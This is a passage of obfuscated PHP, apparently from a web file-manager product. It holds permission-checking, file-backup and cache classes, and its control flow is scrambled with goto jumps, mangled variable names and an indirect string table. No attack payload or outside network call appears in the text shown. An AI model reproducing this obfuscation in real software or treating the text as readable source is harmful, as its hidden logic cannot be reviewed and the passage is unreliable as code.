Model($CÂùÑ¨Çë[1240])->parentLevelArray($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[516]]); $EĞƒ®½®í = array_merge(array($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[397]]), array_reverse($EĞƒ®½®í)); $aš…Ç¼èî´ = $this->sourceAuthSelect($EĞƒ®½®í); goto FùÖ·ŠÁ³­; EôÇùËèÔ: $CÂùÑ¨Çë =& $_SERVER[Ö‘Øù]; if (empty($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[408]]) || isset($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[1929]]) && $a½ÚÎ’˜Çø[$CÂùÑ¨Çë[1929]]) { return $a½ÚÎ’˜Çø; } if (AuthModel::authCheckRoot($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[408]][$CÂùÑ¨Çë[409]])) { return $a½ÚÎ’˜Çø; } goto cºˆ¤“¼ÇŒ; FùÖ·ŠÁ³­: $fä­†‰ø×Æ = array(); $E®íÜº°ºò = array(); foreach ($aš…Ç¼èî´ as $B‹‹®ÊœĞ« => $d’å¯Ã‘£š) { $D„”àä¦æ« = $this->authFolderOwnerUser($d’å¯Ã‘£š); $fä­†‰ø×Æ[$B‹‹®ÊœĞ«] = $D„”àä¦æ«; $E®íÜº°ºò = array_merge($E®íÜº°ºò, $D„”àä¦æ«[$CÂùÑ¨Çë[589]]); if ($D„”àä¦æ«[$CÂùÑ¨Çë[1930]]) { break; } } goto a¥š¤…Îø; fïƒË¸İ–„: $a½ÚÎ’˜Çø[$CÂùÑ¨Çë[408]][$CÂùÑ¨Çë[1931]] = Model($CÂùÑ¨Çë[508])->userListInfo($E®íÜº°ºò); return $a½ÚÎ’˜Çø; goto f–¼èÕ‹”Ø; a¥š¤…Îø: if (count($E®íÜº°ºò) == 0) { $E®íÜº°ºò = $this->authFolderOwnerGroup($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[499]]); } $E®íÜº°ºò = array_unique($E®íÜº°ºò); if (AuthModel::authCheckRoot($a½ÚÎ’˜Çø[$CÂùÑ¨Çë[408]][$CÂùÑ¨Çë[409]])) { $E®íÜº°ºò[] = USER_ID; } goto fïƒË¸İ–„; f–¼èÕ‹”Ø: } private function authFolderOwnerGroup($F‹İù¾‘) { $Cµ»Üôóğ“ =& $_SERVER[Ö‘Øù]; $A‚Ñ¬ïîÑ÷ = Model($Cµ»Üôóğ“[1816])->where(array($Cµ»Üôóğ“[1730] => $F‹İù¾‘))->select(); $D»¢½©Ü³· = array(); if (!$A‚Ñ¬ïîÑ÷) { return $D»¢½©Ü³·; } foreach ($A‚Ñ¬ïîÑ÷ as $Eß«òéÚ¼¯) { $CÏİòáºùó = $this->authInfo($Eß«òéÚ¼¯); if (AuthModel::authCheckRoot($CÏİòáºùó[$Cµ»Üôóğ“[408]])) { $D»¢½©Ü³·[] = $Eß«òéÚ¼¯[$Cµ»Üôóğ“[1561]]; } } return $D»¢½©Ü³·; } private function authFolderOwnerUser($a„¹ôç„) { $DÚÌêù‚”˜ =& $_SERVER[Ö‘Øù]; $e¨£ò°²£Ä = array(); $EÒ×àÅô¸ä = !1; foreach ($a„¹ôç„ as $fËÓ¤ªÌ„‘) { $Aä´áî‹¡Å = $this->authInfo($fËÓ¤ªÌ„‘); if ($fËÓ¤ªÌ„‘[$DÚÌêù‚”˜[499]] == $DÚÌêù‚”˜[191]) { $EÒ×àÅô¸ä = !0; } if ($fËÓ¤ªÌ„‘[$DÚÌêù‚”˜[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Aä´áî‹¡Å[$DÚÌêù‚”˜[408]])) { $e¨£ò°²£Ä[] = $fËÓ¤ªÌ„‘[$DÚÌêù‚”˜[499]]; } } } return array($DÚÌêù‚”˜[589] => $e¨£ò°²£Ä, $DÚÌêù‚”˜[1930] => $EÒ×àÅô¸ä); } public function authMake($fÒÇ¸¡áÄ¾, $EÙ¥íñ…Œó = false) { $F¥á”µçÉÌ =& $_SERVER[Ö‘Øù]; $bî‡Ò®Œ•ß = $this->authArrayCheck($fÒÇ¸¡áÄ¾, $EÙ¥íñ…Œó); if ($bî‡Ò®Œ•ß[$F¥á”µçÉÌ[1932]]) { $bî‡Ò®Œ•ß[$F¥á”µçÉÌ[1932]] = $this->sourceAuthInfo($bî‡Ò®Œ•ß[$F¥á”µçÉÌ[1932]]); } return $bî‡Ò®Œ•ß; } public function authArrayCheck($B‹¤ºóÛ¹°, $cŒÑœîÅøœ = false) { goto d ±ôÄçò„; dÜŠ´¾Ì‡…: foreach ($B‹¤ºóÛ¹° as $fˆ ¹äÓ³) { $fù­‘ô›Õ = $this->authInfo($fˆ ¹äÓ³); if (!$fù­‘ô›Õ) { continue; } $aØ¹‚ÈèÃŸ = $fˆ ¹äÓ³[$A«Âé™È‹©[499]]; $AÏ¥¸ç–­ê = intval($fù­‘ô›Õ[$A«Âé™È‹©[408]]); if ($fˆ ¹äÓ³[$A«Âé™È‹©[406]] == SourceModel::TYPE_USER && $aØ¹‚ÈèÃŸ == $cŒÑœîÅøœ) { $f††ˆÃ×Í» = !0; $C¨ßò©ìî = $fù­‘ô›Õ; $bÃÇİº¬½› = $AÏ¥¸ç–­ê; } else { if ($fˆ ¹äÓ³[$A«Âé™È‹©[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($aØ¹‚ÈèÃŸ, $cŒÑœîÅøœ)) { $e­µÙ®ÜÎ = !0; $bµ®»–‚Ç = $this->groupStepToUserGroup($aØ¹‚ÈèÃŸ, $cŒÑœîÅøœ); if ($bµ®»–‚Ç < $E†«á½Ç¼) { $E†«á½Ç¼ = $bµ®»–‚Ç; $cŒŠŠ…²œ¶ = $AÏ¥¸ç–­ê; $e‹’÷ä¿âÁ = $fù­‘ô›Õ; $fØÉ¬îÆ«Æ = $aØ¹‚ÈèÃŸ; } if ($bµ®»–‚Ç == $E†«á½Ç¼ && $AÏ¥¸ç–­ê >= $cŒŠŠ…²œ¶) { $cŒŠŠ…²œ¶ = $AÏ¥¸ç–­ê; $e‹’÷ä¿âÁ = $fù­‘ô›Õ; $fØÉ¬îÆ«Æ = $aØ¹‚ÈèÃŸ; } } else { if ($aØ¹‚ÈèÃŸ == $A«Âé™È‹©[191]) { $b»²öóš¶ = !0; $A‰ÆööÓçª = $fù­‘ô›Õ; $Fó¾ÜÇĞğù = $AÏ¥¸ç–­ê; } } } } if ($f††ˆÃ×Í») { $aŸ©­²«Œª = $bÃÇİº¬½›; $fù­‘ô›Õ = $C¨ßò©ìî; $aË¯ŒĞ½Î = LNG($A«Âé™È‹©[1933]); } else { if ($e­µÙ®ÜÎ) { $aŸ©­²«Œª = $cŒŠŠ…²œ¶; $fù­‘ô›Õ = $e‹’÷ä¿âÁ; $DÔƒšñŸ­÷ = Model($A«Âé™È‹©[517])->getInfo($fØÉ¬îÆ«Æ); $aË¯ŒĞ½Î = $A«Âé™È‹©[160] . $DÔƒšñŸ­÷[$A«Âé™È‹©[521]] . $A«Âé™È‹©[1934] . LNG($A«Âé™È‹©[1935]); } else { if ($b»²öóš¶) { $aŸ©­²«Œª = $Fó¾ÜÇĞğù; $fù­‘ô›Õ = $A‰ÆööÓçª; $aË¯ŒĞ½Î = LNG($A«Âé™È‹©[1906]); } else { $aŸ©­²«Œª = 0; $fù­‘ô›Õ = !1; $aË¯ŒĞ½Î = $A«Âé™È‹©[33]; } } } $cÑïÃ¢­ = array($A«Âé™È‹©[1925] => intval($aŸ©­²«Œª), $A«Âé™È‹©[1909] => $fù­‘ô›Õ, $A«Âé™È‹©[1926] => $aË¯ŒĞ½Î, $A«Âé™È‹©[1918] => $fˆ ¹äÓ³[$A«Âé™È‹©[397]]); goto DòŸìïÎ£; DòŸìïÎ£: return $cÑïÃ¢­; goto Côº®Ë´¥œ; d Ò›Úã: $Fó¾ÜÇĞğù = 0; $A‰ÆööÓçª = 0; $fˆ ¹äÓ³ = array($A«Âé™È‹©[397] => 0); goto dÜŠ´¾Ì‡…; d ±ôÄçò„: $A«Âé™È‹© =& $_SERVER[Ö‘Øù]; if (!$B‹¤ºóÛ¹°) { return array($A«Âé™È‹©[409] => 0, $A«Âé™È‹©[461] => !1); } $cŒÑœîÅøœ = $cŒÑœîÅøœ ? $cŒÑœîÅøœ : USER_ID; goto fĞ¦ÄÏöˆˆ; c‹†èï¬šï: $e­µÙ®ÜÎ = 0; $cŒŠŠ…²œ¶ = 0; $e‹’÷ä¿âÁ = 0; goto BÆ³×ÛŠ°…; BÆ³×ÛŠ°…: $E†«á½Ç¼ = 1000; $fØÉ¬îÆ«Æ = 0; $b»²öóš¶ = 0; goto d Ò›Úã; fĞ¦ÄÏöˆˆ: $f††ˆÃ×Í» = 0; $bÃÇİº¬½› = 0; $C¨ßò©ìî = 0; goto c‹†èï¬šï; Côº®Ë´¥œ: } private function groupContainUser($Eà‰¡®–¶ , $e˜‰éÎ‚ã¹ = false) { return in_array($Eà‰¡®–¶ , $this->userGroupParents($e˜‰éÎ‚ã¹)); } private function groupStepToUserGroup($e´Ÿ‡•”µ², $EÄƒ ¹Œ = false) { goto C´ä¢‘¨Ñ‰; aå£Í²œââ: return $c‹Çè¥åÔ¨; goto eÈøâõÄ”İ; A‡‰¡„»: $a³®’’òø® = $GLOBALS[$AöÁ‘©ŒÉ¸[6]][$AöÁ‘©ŒÉ¸[88]][$AöÁ‘©ŒÉ¸[1827]] == 1; $Fæ¥…¹¸Šî = $a³®’’òø® ? 3 : 2; foreach ($aªĞ¸„ñàÔ as $a¬Äôä—ã‰) { if ($a¬Äôä—ã‰[$AöÁ‘©ŒÉ¸[1730]] == $e´Ÿ‡•”µ²) { return 0; } $CÄàˆİÍÑ = explode($AöÁ‘©ŒÉ¸[47], trim($a¬Äôä—ã‰[$AöÁ‘©ŒÉ¸[516]], $AöÁ‘©ŒÉ¸[47])); if ($CÄàˆİÍÑ[0] == $AöÁ‘©ŒÉ¸[191] && count($CÄàˆİÍÑ) > $Fæ¥…¹¸Šî) { $BÄ·’ÔÂÕù = array_reverse(array_slice($CÄàˆİÍÑ, $Fæ¥…¹¸Šî)); $eçÎ¼’”Ö¿ = array_search($e´Ÿ‡•”µ², $BÄ·’ÔÂÕù); if ($eçÎ¼’”Ö¿ !== !1 && $eçÎ¼’”Ö¿ + 1 <= $c‹Çè¥åÔ¨) { $c‹Çè¥åÔ¨ = $eçÎ¼’”Ö¿ + 1; } } } goto aå£Í²œââ; C´ä¢‘¨Ñ‰: $AöÁ‘©ŒÉ¸ =& $_SERVER[Ö‘Øù]; $aªĞ¸„ñàÔ = $this->userGroupList($EÄƒ ¹Œ); $c‹Çè¥åÔ¨ = 1000; goto A‡‰¡„»; eÈøâõÄ”İ: } private function userGroupList($cÁ’ñˆïÉ = false) { $B‘á—Éª©Š =& $_SERVER[Ö‘Øù]; static $d÷…ÉæŠ = array(); if (isset($d÷…ÉæŠ[$cÁ’ñˆïÉ])) { return $d÷…ÉæŠ[$cÁ’ñˆïÉ]; } $a¦õÚº˜¿ = Model($B‘á—Éª©Š[533])->getInfo($cÁ’ñˆïÉ); $d÷…ÉæŠ[$cÁ’ñˆïÉ] = array_to_keyvalue($a¦õÚº˜¿[$B‘á—Éª©Š[1907]], $B‘á—Éª©Š[1730]); return $d÷…ÉæŠ[$cÁ’ñˆïÉ]; } public function userGroupParents($c³”é…¹¨’) { goto c™«ŸÖ¤ÑÛ; bÌ®Â¯Åõ÷: if (isset($f»¬ñÔ˜ó[$c³”é…¹¨’])) { return $f»¬ñÔ˜ó[$c³”é…¹¨’]; } $f„¡¬¼‡² = $this->userGroupList($c³”é…¹¨’); $aï¼î¨â— = array(); goto A˜ø¹Òœ¦İ; bÉñä¿®æ«: $f»¬ñÔ˜ó[$c³”é…¹¨’] = array_unique($aï¼î¨â—); return $f»¬ñÔ˜ó[$c³”é…¹¨’]; goto DÙÔ£†”²»; c™«ŸÖ¤ÑÛ: $CÉ½ØÙ–½‰ =& $_SERVER[Ö‘Øù]; static $f»¬ñÔ˜ó = array(); $c³”é…¹¨’ = $c³”é…¹¨’ ? $c³”é…¹¨’ : USER_ID; goto bÌ®Â¯Åõ÷; A˜ø¹Òœ¦İ: $B¿İ¤åê = $GLOBALS[$CÉ½ØÙ–½‰[6]][$CÉ½ØÙ–½‰[88]][$CÉ½ØÙ–½‰[1827]] == 1; $d…œÒ—šÊ = $B¿İ¤åê ? 3 : 2; foreach ($f„¡¬¼‡² as $DÌ¨öÂ„¥Ñ) { $D†Šê‰Ğ‡ = array($DÌ¨öÂ„¥Ñ[$CÉ½ØÙ–½‰[1730]]); $aÇÄè¢…Ğ = explode($CÉ½ØÙ–½‰[47], trim($DÌ¨öÂ„¥Ñ[$CÉ½ØÙ–½‰[516]], $CÉ½ØÙ–½‰[47])); if ($aÇÄè¢…Ğ[0] == $CÉ½ØÙ–½‰[191] && count($aÇÄè¢…Ğ) > $d…œÒ—šÊ) { $FÖ¤Ğ”– = array_slice($aÇÄè¢…Ğ, $d…œÒ—šÊ); $D†Šê‰Ğ‡ = array_merge($D†Šê‰Ğ‡, array_reverse($FÖ¤Ğ”–)); } $aï¼î¨â— = array_merge($aï¼î¨â—, $D†Šê‰Ğ‡); } goto bÉñä¿®æ«; DÙÔ£†”²»: } public function authTargetInfoMake($aéÊğÆ›Ùê) { goto F‡ÎâÍä•; e÷æá¯Ä”: foreach ($aéÊğÆ›Ùê as $CÀ“·ÂÏ¯) { if ($CÀ“·ÂÏ¯[$cÒ‹éŸ­‘¸[406]] == SourceModel::TYPE_USER) { $FÏÍ¶ôÁ×¯[] = intval($CÀ“·ÂÏ¯[$cÒ‹éŸ­‘¸[499]]); } else { if ($CÀ“·ÂÏ¯[$cÒ‹éŸ­‘¸[406]] == SourceModel::TYPE_GROUP) { $eÍùÑ…æ·[] = intval($CÀ“·ÂÏ¯[$cÒ‹éŸ­‘¸[499]]); } } } if ($FÏÍ¶ôÁ×¯) { $FÏÍ¶ôÁ×¯ = Model($cÒ‹éŸ­‘¸[508])->userListInfo($FÏÍ¶ôÁ×¯); } if ($eÍùÑ…æ·) { $B™¤œéÖó = array($cÒ‹éŸ­‘¸[1814] => array($cÒ‹éŸ­‘¸[413], $eÍùÑ…æ·)); $eÍùÑ…æ· = Model($cÒ‹éŸ­‘¸[517])->field($cÒ‹éŸ­‘¸[1936])->where($B™¤œéÖó)->select(); $eÍùÑ…æ· = array_to_keyvalue($eÍùÑ…æ·, $cÒ‹éŸ­‘¸[1730]); } goto fóšîğÖ•ç; F‡ÎâÍä•: $cÒ‹éŸ­‘¸ =& $_SERVER[Ö‘Øù]; $FÏÍ¶ôÁ×¯ = array(); $eÍùÑ…æ· = array(); goto e÷æá¯Ä”; fóšîğÖ•ç: return array($cÒ‹éŸ­‘¸[1937] => $FÏÍ¶ôÁ×¯, $cÒ‹éŸ­‘¸[1938] => $eÍùÑ…æ·); goto eœÅŸÅµÀ¤; eœÅŸÅµÀ¤: } public function authInfo($c–¾éÈÇ‚Ë) { $E¶ËÀİùÕ =& $_SERVER[Ö‘Øù]; if ($c–¾éÈÇ‚Ë[$E¶ËÀİùÕ[1830]]) { $AÆÎŒà±‚Ÿ = Model($E¶ËÀİùÕ[502])->listData($c–¾éÈÇ‚Ë[$E¶ËÀİùÕ[1830]]); if (!$AÆÎŒà±‚Ÿ) { return !1; $c†…‘ª•„ò = Model($E¶ËÀİùÕ[502])->listData(); $fÁ‡ö¢ÏƒŠ = array_filter_by_field($c†…‘ª•„ò, $E¶ËÀİùÕ[408], $E¶ËÀİùÕ[191]); return $fÁ‡ö¢ÏƒŠ; } $B¶î¨¤¨¸ = array_field_key($AÆÎŒà±‚Ÿ, array($E¶ËÀİùÕ[395], $E¶ËÀİùÕ[28], $E¶ËÀİùÕ[408], $E¶ËÀİùÕ[1752], $E¶ËÀİùÕ[1753])); $B¶î¨¤¨¸[$E¶ËÀİùÕ[1939]] = $c–¾éÈÇ‚Ë; return $B¶î¨¤¨¸; } else { return array($E¶ËÀİùÕ[414] => 0, $E¶ËÀİùÕ[1736] => $c–¾éÈÇ‚Ë[$E¶ËÀİùÕ[1884]], $E¶ËÀİùÕ[415] => $E¶ËÀİùÕ[33], $E¶ËÀİùÕ[1752] => $E¶ËÀİùÕ[1940]); } } } goto bÊ¡ˆ·¾ÒÚ; aÌÏ¾…ª: class BackupFile { public function __construct() { } public function index() { goto f¸£¡ˆ´²Â; dƒ² ‹Î¤: $this->_fileFilter($a ¬†¨Ì©); return !0; goto fÌ…›Ã•èÜ; f¸£¡ˆ´²Â: $eŸ²‘åˆ = Backup::get(); $d´òºì¿ = $eŸ²‘åˆ[$_SERVER[Ö‘Øù][291]][$_SERVER[Ö‘Øù][193]][$_SERVER[Ö‘Øù][462]]; $d›®¨òŒï = array($_SERVER[Ö‘Øù][463] => array($_SERVER[Ö‘Øù][807], $d´òºì¿), $_SERVER[Ö‘Øù][808] => array($_SERVER[Ö‘Øù][329], $eŸ²‘åˆ[$_SERVER[Ö‘Øù][745]])); goto d…Ü¶Œµ½÷; aÚë¢§Úé­: $bßä´êóöË->task[$_SERVER[Ö‘Øù][756]] = $fµæã²¼Ã; $e“•ò“¯Œ = array($_SERVER[Ö‘Øù][811] => $BÂ§ªåÒŸÚ, $_SERVER[Ö‘Øù][812] => $fµæã²¼Ã, $_SERVER[Ö‘Øù][813] => time()); Backup::set($e“•ò“¯Œ); goto E¨ø°º°É; E¨ø°º°É: $aíÅ¥Ğƒ¨¯ = !0; $e¯Ì¿¥Çõö = $this->storeIds(); $F‡‡ÑÑó˜ = 1; goto dòÒì½Ï¾”; d…Ü¶Œµ½÷: $BÂ§ªåÒŸÚ = (int) Model($_SERVER[Ö‘Øù][780])->where($d›®¨òŒï)->count($_SERVER[Ö‘Øù][462]); $fµæã²¼Ã = (int) Model($_SERVER[Ö‘Øù][780])->where($d›®¨òŒï)->sum($_SERVER[Ö‘Øù][78]); $bßä´êóöË = new TaskFileTransfer($_SERVER[Ö‘Øù][809], $_SERVER[Ö‘Øù][775], $BÂ§ªåÒŸÚ, LNG($_SERVER[Ö‘Øù][776]) . $_SERVER[Ö‘Øù][777] . LNG($_SERVER[Ö‘Øù][810])); goto aÚë¢§Úé­; fôå—–µÆá: $e“•ò“¯Œ = array($_SERVER[Ö‘Øù][823] => 1, $_SERVER[Ö‘Øù][491] => time(), $_SERVER[Ö‘Øù][768] => 1, $_SERVER[Ö‘Øù][820] => $d´òºì¿, $_SERVER[Ö‘Øù][812] => $fµæã²¼Ã, $_SERVER[Ö‘Øù][811] => $BÂ§ªåÒŸÚ, $_SERVER[Ö‘Øù][824] => time()); if ($BÈíò™‚„) { $e“•ò“¯Œ[$_SERVER[Ö‘Øù][821]] = $eœ¹ºä®ÑÀ; $e“•ò“¯Œ[$_SERVER[Ö‘Øù][822]] = $dÓæ„­‡Ê; } Backup::set($e“•ò“¯Œ); goto dƒ² ‹Î¤; dòÒì½Ï¾”: $cë¥ŒÛŞĞ = 1000; $D¥’¶œõå¯ = $BÈíò™‚„ = 0; $a ¬†¨Ì© = array(); goto dºœÑÇô; dºœÑÇô: $dÓæ„­‡Ê = $eœ¹ºä®ÑÀ = 0; do { $CÂÛ­Û®è = $_SERVER[Ö‘Øù][814]; $açÊæò†Ôñ = Model($_SERVER[Ö‘Øù][780])->where($d›®¨òŒï)->field($CÂÛ­Û®è)->order($_SERVER[Ö‘Øù][815])->selectPage($cë¥ŒÛŞĞ, $F‡‡ÑÑó˜); $F„ß°•Ÿß = !empty($açÊæò†Ôñ[$_SERVER[Ö‘Øù][367]]) ? $açÊæò†Ôñ[$_SERVER[Ö‘Øù][367]] : array(); foreach ($F„ß°•Ÿß as $b¨¿Œ‡Ú¨È) { goto Aï­ïº›™¡; aÖ†¤…ÓŒ: if (IO::exist($C´õ´¬ ±)) { $bßä´êóöË->updateFileEnd($b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][28]], $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][78]]); } else { $C´õ´¬ ± = get_path_father($C´õ´¬ ±); IO::mkdir($C´õ´¬ ±); if (!IO::copy($EÃ×ŒÎùç, $C´õ´¬ ±, $_SERVER[Ö‘Øù][818])) { write_log($_SERVER[Ö‘Øù][819] . $EÃ×ŒÎùç . $_SERVER[Ö‘Øù][802] . $C´õ´¬ ± . $_SERVER[Ö‘Øù][531], $_SERVER[Ö‘Øù][775]); $aíÅ¥Ğƒ¨¯ = !1; break; } } $d´òºì¿ = $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][462]]; $BÈíò™‚„ += 1; goto eìÚÑŞñµ¬; eìÚÑŞñµ¬: $D¥’¶œõå¯ += $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][78]]; $eœ¹ºä®ÑÀ += 1; $dÓæ„­‡Ê += $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][78]]; goto e‹®›‘‡³°; e‹®›‘‡³°: if ($D¥’¶œõå¯ >= 1024 * 1024 * 100) { $e“•ò“¯Œ = array($_SERVER[Ö‘Øù][820] => $d´òºì¿, $_SERVER[Ö‘Øù][821] => $eœ¹ºä®ÑÀ, $_SERVER[Ö‘Øù][822] => $dÓæ„­‡Ê); Backup::set($e“•ò“¯Œ); $D¥’¶œõå¯ = $BÈíò™‚„ = 0; } goto A†èÙ¯ÅŞ; Aï­ïº›™¡: if (!$this->_fileExist($b¨¿Œ‡Ú¨È, $a ¬†¨Ì©, $e¯Ì¿¥Çõö)) { $BÂ§ªåÒŸÚ -= 1; $fµæã²¼Ã -= (int) $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][78]]; write_log("\146\x69\x6c\145\x20\156\x6f\x74\40\x65\x78\x69\163\164\56\x66\x69\154\x65\111\x44\72{$b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][462]]}\54\x20\160\141\x74\x68\x3a{$b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][76]]}", $_SERVER[Ö‘Øù][816]); continue; } $EÃ×ŒÎùç = $b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][76]]; $C´õ´¬ ± = "\x7b\151\157\x3a{$eŸ²‘åˆ[$_SERVER[Ö‘Øù][745]]}\175" . substr($EÃ×ŒÎùç, strlen("\x7b\151\x6f\x3a{$b¨¿Œ‡Ú¨È[$_SERVER[Ö‘Øù][817]]}\175")); goto aÖ†¤…ÓŒ; A†èÙ¯ÅŞ: } $f­õƒšÖİù = count($F„ß°•Ÿß); $F‡‡ÑÑó˜++; } while ($f­õƒšÖİù == $cë¥ŒÛŞĞ); $bßä´êóöË->end(); goto fôå—–µÆá; fÌ…›Ã•èÜ: } private function _fileExist($b”°ö…„ˆ, &$fºï³¸, $AìÓ†ÀÂÏ) { goto F£šïÅ°÷; b¦å‚Èï‡: if (IO::exist($DäÂŠØä)) { $fºï³¸[] = $b”°ö…„ˆ[$b‹‘Üîñª[462]]; return !1; } $EÎ§ì²¾‹Õ = array($b‹‘Üîñª[817] => $b”°ö…„ˆ[$b‹‘Üîñª[817]], $b‹‘Üîñª[76] => array($b‹‘Üîñª[381], "{$DäÂŠØä}\x25")); $EÆ§òõ¯îÇ = Model($b‹‘Üîñª[780])->where($EÎ§ì²¾‹Õ)->field($b‹‘Üîñª[463])->select(); goto EÌëäš§£Œ; EÌëäš§£Œ: $fºï³¸ = array_merge($fºï³¸, array_to_keyvalue($EÆ§òõ¯îÇ, $b‹‘Üîñª[33], $b‹‘Üîñª[462])); return !1; goto F´ÔŠˆáĞõ; DÛ£¿ÎÖ‘Ú: if (!in_array($b”°ö…„ˆ[$b‹‘Üîñª[817]], $AìÓ†ÀÂÏ)) { return !1; } if (IO::exist($f°ò¤Ï£ŒÂ)) { return !0; } $DäÂŠØä = get_path_father($f°ò¤Ï£ŒÂ); goto b¦å‚Èï‡; F£šïÅ°÷: $b‹‘Üîñª =& $_SERVER[Ö‘Øù]; $f°ò¤Ï£ŒÂ = $b”°ö…„ˆ[$b‹‘Üîñª[76]]; if (in_array($b”°ö…„ˆ[$b‹‘Üîñª[462]], $fºï³¸)) { return !1; } goto DÛ£¿ÎÖ‘Ú; F´ÔŠˆáĞõ: } private function _fileFilter($cÀ’¦˜œ‹¶) { $A“º¤ƒá½ =& $_SERVER[Ö‘Øù]; if (empty($cÀ’¦˜œ‹¶)) { return; } $dîÀËˆËõÙ = array($A“º¤ƒá½[462] => array($A“º¤ƒá½[7], array_unique($cÀ’¦˜œ‹¶))); $BÍè¤æ×éŒ = Model($A“º¤ƒá½[825])->where($dîÀËˆËõÙ)->field($A“º¤ƒá½[397])->select(); foreach ($BÍè¤æ×éŒ as $DŞ¶—ª·…) { Model($A“º¤ƒá½[825])->remove($DŞ¶—ª·…[$A“º¤ƒá½[397]], !1); } } private function storeIds() { $E¿šŠ„Ú¥§ =& $_SERVER[Ö‘Øù]; $CŞ¢‡ŠÃ = Model($E¿šŠ„Ú¥§[760])->listData(); $Cóæƒ’îÓ = array(); $d»—ò¡ñ·Ë = $GLOBALS[$E¿šŠ„Ú¥§[6]][$E¿šŠ„Ú¥§[88]][$E¿šŠ„Ú¥§[826]]; foreach ($CŞ¢‡ŠÃ as $BŸ¯ô·ÏÌ) { $D¤ÎÊí¢¹à = strtolower($BŸ¯ô·ÏÌ[$E¿šŠ„Ú¥§[94]]); if (!isset($d»—ò¡ñ·Ë[$D¤ÎÊí¢¹à])) { continue; } $Dğš‚æèˆ´ = $E¿šŠ„Ú¥§[72] . (isset($d»—ò¡ñ·Ë[$D¤ÎÊí¢¹à]) ? $d»—ò¡ñ·Ë[$D¤ÎÊí¢¹à] : ucfirst($D¤ÎÊí¢¹à)); if (!class_exists($Dğš‚æèˆ´)) { continue; } $Cóæƒ’îÓ[] = $BŸ¯ô·ÏÌ[$E¿šŠ„Ú¥§[395]]; } return $Cóæƒ’îÓ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aïÜàäâä; aïÜàäâä: $CÀ‰†÷æ—õ =& $_SERVER[Ö‘Øù]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto d˜ÖóÆİ÷¶; d˜ÖóÆİ÷¶: $F©½Âôä® = $GLOBALS[$CÀ‰†÷æ—õ[6]][$CÀ‰†÷æ—õ[347]]; $E…ÀŞñ·ª = $F©½Âôä®[$F©½Âôä®[$CÀ‰†÷æ—õ[827]]]; $DÏº²÷ª‡¯ = $F©½Âôä®[$CÀ‰†÷æ—õ[828]]; goto Cá‹æ„‚ù; Cá‹æ„‚ù: switch ($F©½Âôä®[$CÀ‰†÷æ—õ[827]]) { case $CÀ‰†÷æ—õ[17]: self::$handle = Model($CÀ‰†÷æ—õ[829]); break; case $CÀ‰†÷æ—õ[830]: self::$handle = new CacheRedis($E…ÀŞñ·ª, $DÏº²÷ª‡¯); break; case $CÀ‰†÷æ—õ[831]: self::$handle = new CacheMemcached($E…ÀŞñ·ª, $DÏº²÷ª‡¯); break; case $CÀ‰†÷æ—õ[193]: self::$handle = new CacheFile($E…ÀŞñ·ª, $DÏº²÷ª‡¯); break; default: break; } return self::$handle; goto f§‰É’‚Ü; f§‰É’‚Ü: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($e„”ÍÁ¹Ã¶) { if (is_array($e„”ÍÁ¹Ã¶) || is_object($e„”ÍÁ¹Ã¶)) { $e„”ÍÁ¹Ã¶ = json_encode($e„”ÍÁ¹Ã¶); } $e„”ÍÁ¹Ã¶ = rawurlencode($e„”ÍÁ¹Ã¶); return md5(KOD_SITE_ID . $_SERVER[Ö‘Øù][71] . $e„”ÍÁ¹Ã¶); } public static function get($DÆÚÄ•“—„, $eÌ®¡¡Î†‡ = false) { $fÃõÎ«Òî = self::key($DÆÚÄ•“—„); if ($eÌ®¡¡Î†‡) { return unserialize(self::init()->get($fÃõÎ«Òî)); } if (!isset(self::$memoryCache[$fÃõÎ«Òî])) { $F±¦•ÙæÅ = self::init()->get($fÃõÎ«Òî); self::$memoryCache[$fÃõÎ«Òî] = unserialize($F±¦•ÙæÅ); } return self::$memoryCache[$fÃõÎ«Òî]; } public static function set($f…óàÁá…Œ, $C‘» ÕŒ®, $f®â¯‚î†Ä = false) { goto e´¤È®È­; aíĞš›óµÑ: CacheLock::lock($f…óàÁá…Œ); $eçñõöÀ”‘ = self::init()->set($F„ìÖ“Ü•Ú, serialize($C‘» ÕŒ®), $f®â¯‚î†Ä); self::$memoryCache[$F„ìÖ“Ü•Ú] = $C‘» ÕŒ®; goto A¬÷´…‰Ãì; A¬÷´…‰Ãì: CacheLock::unlock($f…óàÁá…Œ); return $eçñõöÀ”‘; goto A©É²°ÂÀÏ; e´¤È®È­: $F„ìÖ“Ü•Ú = self::key($f…óàÁá…Œ); if (isset(self::$memoryCache[$F„ìÖ“Ü•Ú]) && self::$memoryCache[$F„ìÖ“Ü•Ú] === $C‘» ÕŒ®) { return !0; } if ($f®â¯‚î†Ä === 0) { self::$memoryCache[$F„ìÖ“Ü•Ú] = $C‘» ÕŒ®; return !0; } goto aíĞš›óµÑ; A©É²°ÂÀÏ: } public static function getCall($D’êºŸ¤·¯, $B•œÄìó¹, $C¤À§ÑèöÚ, $D×Â¼…„ºˆ = array()) { goto eÀÁ²ô–¢Ì; eÀÁ²ô–¢Ì: $fŠˆ»ßäÒÄ =& $_SERVER[Ö‘Øù]; $AÚ²Ö£õÑ® = self::get($D’êºŸ¤·¯); if ($AÚ²Ö£õÑ® || $AÚ²Ö£õÑ® === $fŠˆ»ßäÒÄ[33]) { return $AÚ²Ö£õÑ®; } goto b¾‘ò °î; e’ß—©õÌ¹: return $AÚ²Ö£õÑ®; goto C»¼ªÌ“‘Ç; b¾‘ò °î: $AÚ²Ö£õÑ® = 